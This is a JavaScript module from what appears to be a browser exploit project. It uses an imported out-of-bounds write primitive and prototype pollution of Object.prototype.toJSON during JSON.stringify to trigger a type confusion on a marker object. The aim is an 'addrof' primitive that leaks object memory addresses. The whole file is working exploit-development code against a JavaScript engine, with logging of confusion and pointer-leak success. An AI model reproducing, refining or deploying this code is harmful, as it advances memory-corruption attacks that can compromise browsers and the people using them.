// js/script3/testArrayBufferVictimCrash.mjs (v76_RevertToV20WithGetterAndValueIteration)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV = "OriginalHeisenbug_TypedArrayAddrof_v76_RevertV20Getter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
// const OOB_WRITE_VALUE = 0xFFFFFFFF; // Será iterado

let object_to_leak_A_v76 = null;
let object_to_leak_B_v76 = null;
let victim_typed_array_ref_v76 = null; 
let probe_call_count_v76 = 0;
// Armazena o objeto de detalhes da última chamada da sonda onde 'this' foi o marcador M2 e estava confuso
let last_details_of_M2_confusion_v76 = null; 
let marker_M1_ref_v76 = null; // Referência ao objeto retornado pela P1
let marker_M2_ref_v76 = null; // Referência ao objeto retornado pela P2

const PROBE_CALL_LIMIT_V76 = 7; // Aumentar um pouco o limite


function toJSON_TA_Probe_V20RevivalGetter() {
    probe_call_count_v76++;
    const call_num = probe_call_count_v76;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v76),
        this_is_M1: (this === marker_M1_ref_v76 && marker_M1_ref_v76 !== null),
        this_is_M2: (this === marker_M2_ref_v76 && marker_M2_ref_v76 !== null),
        getter_defined_on_M2: false,
        direct_prop_set_on_M2: false,
        error_in_probe: null
    };
    logS3(`[PROBE_V76] Call #${call_num}. 'this': ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsM1? ${current_call_details.this_is_M1}. IsM2? ${current_call_details.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V76) {
            logS3(`[PROBE_V76] Call #${call_num}: Probe limit. Stop.`, "warn");
            // Atualizar last_details_of_M2_confusion_v76 com esta chamada se for a mais relevante até agora
            if (!last_details_of_M2_confusion_v76 || call_num > (last_details_of_M2_confusion_v76.call_number || 0)) {
                last_details_of_M2_confusion_v76 = current_call_details;
            }
            return { recursion_stopped_v76: true };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[PROBE_V76] Call #${call_num}: 'this' is victim. Returning M1.`, "info");
            marker_M1_ref_v76 = { marker_id_v76: "M1_V76" };
            last_details_of_M2_confusion_v76 = current_call_details; // Captura estado da P1
            return marker_M1_ref_v76;
        } else if (call_num === 2 && current_call_details.this_type === '[object Object]' && !current_call_details.this_is_victim && !current_call_details.this_is_M1) {
            // Call #2, this é um ObjX confuso (não M1, não vítima)
            logS3(`[PROBE_V76] Call #${call_num}: 'this' is ObjX (unexpected ${current_call_details.this_type}). Returning M2.`, "info");
            marker_M2_ref_v76 = { marker_id_v76: "M2_V76" };
            last_details_of_M2_confusion_v76 = current_call_details; // Captura estado da P2
            return marker_M2_ref_v76;
        } else if (call_num >= 2 && current_call_details.this_is_M2 && current_call_details.this_type === '[object Object]') {
            // ESTE É O ALVO: this é M2 e está confuso!
            logS3(`[PROBE_V76] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! Marker ID: ${this.marker_id_v76}. Defining getter & prop...`, "vuln");
            
            Object.defineProperty(this, 'leaky_A_getter_v76', {
                get: function() {
                    logS3(`[PROBE_V76] !!! Getter 'leaky_A_getter_v76' on confused M2 (call #${call_num}) FIRED !!!`, "vuln");
                    return object_to_leak_A_v76;
                },
                enumerable: true, configurable: true
            });
            current_call_details.getter_defined_on_M2 = true;
            
            this.leaky_B_direct_v76 = object_to_leak_B_v76;
            current_call_details.direct_prop_set_on_M2 = true;
            logS3(`[PROBE_V76] Call #${call_num}: Getter and direct prop set on M2 ('this'). Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_details_of_M2_confusion_v76 = current_call_details; // Captura ESTA chamada como a de interesse
            return this; // Retorna M2 modificado
        } else {
             logS3(`[PROBE_V76] Call #${call_num}: Path not taken for specific action. 'this' type: ${current_call_details.this_type}`, "dev_verbose");
             // Atualiza os detalhes se esta chamada for mais profunda e nenhuma confusão M2 ocorreu ainda
             if (!last_details_of_M2_confusion_v76 || call_num > (last_details_of_M2_confusion_v76.call_number || 0) || !last_details_of_M2_confusion_v76.this_is_M2) {
                last_details_of_M2_confusion_v76 = current_call_details;
             }
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[PROBE_V76] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        if (!last_details_of_M2_confusion_v76 || call_num >= (last_details_of_M2_confusion_v76.call_number || 0) ) {
            last_details_of_M2_confusion_v76 = current_call_details;
        }
    }
    
    return { generic_marker_v76: call_num, call_num_is: call_num }; // Retorno genérico
}

export async function executeTypedArrayVictimAddrofTest_RevertV20WithGetterAndValueIteration() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (RevertV20GetterAndValueIteration) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV} Init...`;

    const OOB_WRITE_VALUES_V76 = [0xFFFFFFFF, 0x7FFFFFFF]; // Testar estes dois valores
    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V76) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v76 = 0;
        last_details_of_M2_confusion_v76 = null; 
        victim_typed_array_ref_v76 = null; 
        marker_M1_ref_v76 = null;
        marker_M2_ref_v76 = null;
        object_to_leak_A_v76 = { marker_A_v76: `LeakA_Val${toHex(current_oob_value)}`, idA: Date.now() }; 
        object_to_leak_B_v76 = { marker_B_v76: `LeakB_Val${toHex(current_oob_value)}`, idB: Date.now() + 1 };

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_Victim_A = { success: false, msg: "VictimA: Default" }; // Para checar o buffer original
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};

        const fillPattern = 0.76767676767676;

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write: offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v76 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v76.buffer); 
            for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
            logS3(`STEP 2: victim_typed_array_ref_v76 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_V20RevivalGetter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v76); 
                logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try {
                    stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
                } catch (e_parse) {
                    stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                }
                
                logS3(`  EXECUTE: Details of M2 Confusion (if occurred): ${last_details_of_M2_confusion_v76 ? JSON.stringify(last_details_of_M2_confusion_v76) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = false;
                if (last_details_of_M2_confusion_v76 && 
                    last_details_of_M2_confusion_v76.this_is_M2 &&
                    last_details_of_M2_confusion_v76.this_type === "[object Object]") {
                    heisenbugOnM2 = true;
                }
                logS3(`  EXECUTE: Heisenbug on M2 ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                // Verificar buffer da vítima (não esperamos alteração)
                if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
                
                // StringifyOutput é M1. Precisamos ver se M2 (o 'this' da P3) foi serializado DENTRO do stringifyOutput.
                // Na v20, M1 não continha M2. M2 era retornado pela P3 e o runner o logava.
                // Para este teste, o stringifyOutput é o que JSON.stringify(M1) retorna.
                // O objeto de interesse é last_details_of_M2_confusion_v76, que é o 'this' da P3 (M2)
                // ou o current_call_details sobre ele.
                let targetForLeakCheck = null;
                if (heisenbugOnM2 && last_details_of_M2_confusion_v76 === marker_M2_ref_v76) { // Se o global é o próprio M2
                     targetForLeakCheck = last_details_of_M2_confusion_v76; // que é M2 modificado
                     logS3("   Checking last_details_of_M2_confusion_v76 (M2 itself) for leaked properties...", "info", FNAME_CURRENT_ITERATION);
                } else if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v76 === "M2_V76") { // Se stringifyOutput for M2
                     targetForLeakCheck = stringifyOutput_parsed;
                     logS3("   Checking stringifyOutput_parsed (M2) for leaked properties...", "info", FNAME_CURRENT_ITERATION);
                } else if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v76 === "M1_V76" && stringifyOutput_parsed.payload_M2_marker && stringifyOutput_parsed.payload_M2_marker.marker_id_v76 === "M2_V76") {
                     // Se M1 contivesse M2 e M2 fosse o objeto modificado
                     targetForLeakCheck = stringifyOutput_parsed.payload_M2_marker;
                     logS3("   Checking M2 nested in stringifyOutput_parsed (M1) for leaked properties...", "info", FNAME_CURRENT_ITERATION);
                }


                if (targetForLeakCheck) {
                    const val_getter = targetForLeakCheck.leaky_A_getter_v76; // Dispara o getter
                    if (typeof val_getter === 'number' && val_getter !==0) {
                        let getter_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || (getter_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from M2.leaky_A_getter: ${getter_int64.toString(true)}`;
                        } else { addrof_M2_Getter.msg = `M2.leaky_A_getter is num but not ptr: ${val_getter}`; }
                    } else if (val_getter && val_getter.marker_A_v76 === object_to_leak_A_v76.marker_A_v76) {
                         addrof_M2_Getter.success = true; addrof_M2_Getter.msg = "object_to_leak_A_v76 identity from M2.leaky_A_getter.";
                    } else { addrof_M2_Getter.msg = `M2.leaky_A_getter not ptr. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = targetForLeakCheck.leaky_B_direct_v76;
                    if (typeof val_direct === 'number' && val_direct !==0) {
                        let direct_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_direct]).buffer)[0], new Uint32Array(new Float64Array([val_direct]).buffer)[1]);
                         if ((direct_int64.high() > 0 && direct_int64.high() < 0x000F0000) || (direct_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Direct.success = true; addrof_M2_Direct.msg = `Possible pointer from M2.leaky_B_direct: ${direct_int64.toString(true)}`;
                        } else { addrof_M2_Direct.msg = `M2.leaky_B_direct is num but not ptr: ${val_direct}`; }
                    } else if (val_direct && val_direct.marker_B_v76 === object_to_leak_B_v76.marker_B_v76) {
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v76 identity from M2.leaky_B_direct.";
                    } else { addrof_M2_Direct.msg = `M2.leaky_B_direct not ptr. Val: ${JSON.stringify(val_direct)}`; }
                } else {
                    addrof_M2_Getter.msg = "Target object M2 for leak check not found or not as expected.";
                    addrof_M2_Direct.msg = "Target object M2 for leak check not found or not as expected.";
                    logS3(`   Target M2 not found in stringifyOutput_parsed as expected. stringifyOutput_parsed: ${JSON.stringify(stringifyOutput_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                }


            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            last_probe_M2_details: last_details_of_M2_confusion_v76 ? JSON.parse(JSON.stringify(last_details_of_M2_confusion_v76)) : null, 
            final_stringify_output: stringifyOutput_parsed,
            addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct}
        });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            logS3(`!!!! POTENTIAL ADDROF SUCCESS for OOB Value ${toHex(current_oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV}: Addr? ${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(200); 
    } // Fim do loop OOB_WRITE_VALUES_V76

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => {
        logS3(`OOBVal ${res.oob_value}: AddrGetter=${res.addrof_M2_Getter.success}, AddrDirect=${res.addrof_M2_Direct.success}. M2 TC'd? ${res.last_probe_M2_details?.this_is_M2 && res.last_probe_M2_details?.this_type==='[object Object]'}. Err: ${res.error || 'None'}`, 
              (res.addrof_M2_Getter.success || res.addrof_M2_Direct.success) ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V76_RV20GWV}: All Vals Tested.`;
    
    return { 
        overall_results: overall_results,
        // Para o runner, fornecer os resultados da última iteração ou a primeira bem-sucedida.
        // Por simplicidade, vamos pegar a última. O log detalhado está acima.
        toJSON_details: overall_results.length > 0 ? overall_results[overall_results.length-1].last_probe_M2_details : null,
        stringifyResult: overall_results.length > 0 ? overall_results[overall_results.length-1].final_stringify_output : null,
        addrof_A_result: overall_results.length > 0 ? overall_results[overall_results.length-1].addrof_M2_Getter : addrof_M2_Getter, // Mapeando para A e B para o runner
        addrof_B_result: overall_results.length > 0 ? overall_results[overall_results.length-1].addrof_M2_Direct : addrof_M2_Direct,
        total_probe_calls: probe_call_count_v76 // Este será o total da última iteração
    };
}
